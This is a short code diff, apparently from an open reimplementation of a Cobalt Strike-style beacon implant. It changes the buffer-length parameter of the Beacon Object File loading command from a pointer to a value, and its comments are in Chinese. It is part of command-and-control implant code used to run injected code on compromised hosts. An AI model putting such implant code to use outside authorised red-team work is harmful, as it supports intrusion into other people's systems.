@@ -61,7 +61,7 @@ BOOL processRelocation(PBEACON_RELOCATION pImageRelocation, char* lpCodeStart, c
 	return TRUE;
 }
 
-VOID CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen) {
+VOID CmdBeaconBof(unsigned char* commandBuf, size_t commandBuflen) {
 	// Beacon 内部 API
 	Beacon_Internal_Api* api = malloc(sizeof(Beacon_Internal_Api));
 	if (!api) {
@@ -72,7 +72,7 @@ VOID CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen) {
 
 	// 入口函数偏移
 	datap parse;
-	BeaconDataParse(&parse, commandBuf, *commandBuflen);
+	BeaconDataParse(&parse, commandBuf, commandBuflen);
 	int entryPoint = BeaconDataInt(&parse);
 
 	// 代码段
